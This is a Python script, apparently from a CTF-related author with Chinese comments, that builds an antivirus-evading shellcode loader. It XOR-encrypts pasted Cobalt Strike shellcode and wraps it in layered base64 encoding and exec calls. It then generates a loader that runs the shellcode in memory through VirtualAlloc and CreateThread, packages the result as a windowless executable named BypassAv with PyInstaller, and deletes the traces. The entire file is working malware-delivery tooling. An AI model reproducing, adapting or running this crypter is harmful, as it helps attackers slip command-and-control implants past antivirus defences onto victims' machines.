# 2023-06-18 ffctf
import base64
import ctypes
import os
import PyInstaller.__main__
import shutil

#填入cs生成的pyshellcode
originalShellcode = b""
encryptedShellcode = bytes([byte ^ 0xFF for byte in originalShellcode])
encodedShellcode = base64.b64encode(encryptedShellcode).decode('utf-8')
encodedShellcode = str(base64.b64encode(encodedShellcode.encode('UTF-8')), 'UTF-8')

loader="""
# 获取 kernel32.dll 模块的句柄
kernel32 = ctypes.WinDLL('kernel32')
kernel32.GetModuleHandleW.restype = ctypes.c_void_p
module_handle = kernel32.GetModuleHandleW(None)
# 定义 WinAPI 函数的参数和返回类型
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
kernel32.CreateThread.restype = ctypes.c_void_p
kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]

# 创建可写的内存缓冲区
buffer = (ctypes.c_char * len(decrypted_shellcode)).from_buffer(decrypted_shellcode)

# 使用 VirtualAlloc 在进程中分配内存
mem = kernel32.VirtualAlloc(None, len(decrypted_shellcode), 0x1000 | 0x2000, 0x40)
if not mem:
    raise Exception("VirtualAlloc 失败")

# 将解密后的 shellcode 复制到分配的内存空间中
ctypes.memmove(mem, buffer, len(decrypted_shellcode))

# 创建线程执行 shellcode
thread_handle = kernel32.CreateThread(None, 0, mem, None, 0, ctypes.byref(ctypes.c_ulong()))

# 等待线程执行完成
kernel32.WaitForSingleObject(thread_handle, -1)

"""
Jiami = str(base64.b64encode(loader.encode('UTF-8')), 'UTF-8')
for i in range(1,5):
    Jiami = str(base64.b64encode(Jiami.encode('UTF-8')), 'UTF-8')
Decode=base64.b64decode(Jiami)
for j in range(1,5):
    Decode=base64.b64decode(Decode)


body="""
import ctypes
import base64
encrypted_shellcode = \"""" + encodedShellcode + '\"' + """
encrypted_shellcode=base64.b64decode(encrypted_shellcode)
decoded_shellcode = base64.b64decode(encrypted_shellcode)

decrypted_shellcode = bytearray(decoded_shellcode)
Jiami=\"""" + Jiami+ '\"' + """
for i in range(len(decrypted_shellcode)):
    decrypted_shellcode[i] ^= 0xFF
Decode=base64.b64decode(Jiami)
for j in range(1,5):
    Decode=base64.b64decode(Decode)
exec(Decode)

"""
Code = str(base64.b64encode(body.encode('UTF-8')), 'UTF-8')
for i in range(1,6):
    Code = str(base64.b64encode(Code.encode('UTF-8')), 'UTF-8')

file = open('BypassAv.py', 'w',encoding="utf-8")


file.write("""
import base64
import ctypes

Code1=\""""'' +Code+ '' """\"
for j in range(1,7):
    Code1=base64.b64decode(Code1)
exec(Code1)
""")

file.close()
try:
    # 获取要打包的脚本路径
    script_file = "BypassAv.py"
    # 获取 PyInstaller 路径
    pyinstaller_path = os.path.dirname(PyInstaller.__main__.__file__)
    # 设置打包选项
    build_args = [
        "--onefile",  # 生成一个单独的可执行文件
        "--noconsole",  # 不显示命令行窗口
        "--name=BypassAv",  # 设置生成的可执行文件名
        "-i=i.ico",  # ico
        script_file  # 添加要打包的脚本路径
    ]
    # 执行打包命令
    PyInstaller.__main__.run(build_args)
except:
    print("exe在dist文件夹内")
# 删除 build 文件夹和.spec文件
shutil.rmtree("./build")
os.remove("./BypassAv.spec")
os.remove("./BypassAv.py")
